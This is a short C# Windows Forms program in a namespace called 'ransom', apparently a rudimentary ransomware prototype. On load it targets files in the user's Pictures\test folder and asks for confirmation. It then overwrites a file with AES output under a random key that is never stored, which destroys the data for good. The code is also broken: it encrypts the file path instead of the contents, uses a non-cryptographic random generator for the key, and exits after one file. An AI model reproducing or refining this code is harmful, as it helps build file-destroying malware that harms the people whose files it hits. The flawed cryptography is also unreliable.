﻿using System;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;

namespace ransom
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

        }

        public void Form1_Load(object sender, EventArgs e)
        {
            string userName = Environment.GetEnvironmentVariable("USERNAME");
            string[] filePaths = Directory.GetFiles(@"c:\Users\" + userName + @"\Pictures\test");
            foreach (var gek in filePaths)
            {
                var geen =  gek.Substring(0, gek.IndexOf("Pictures")) + "Pictures.";
                var geek = MessageBox.Show("You're about to encrypt everything in " + geen + Environment.NewLine + "Are you sure ?", "Last chance", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if(geek == DialogResult.No)
                {
                    Application.Exit();
                    return;
                }
                if (geek == DialogResult.Yes)
                {

                    File.ReadAllBytes(gek);
                    byte[] key;
                    byte[] iv;

                    using (var aes = new AesManaged())
                    {
                        key = new byte[256 / 8];
                        iv = new byte[128 / 8];
                        var r = new Random();
                        r.NextBytes(key);
                        r.NextBytes(iv);

                        ICryptoTransform encryptor = aes.CreateEncryptor(key, iv);

                        using (MemoryStream ms = new MemoryStream())
                        {
                            using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                            {
                                using (StreamWriter sw = new StreamWriter(cs))
                                {
                                    sw.Write(gek);
                                }
                                File.WriteAllBytes(gek, ms.ToArray());
                                Application.Exit();
                            }
                        }
                    }
                }

            }
        }
    }
}
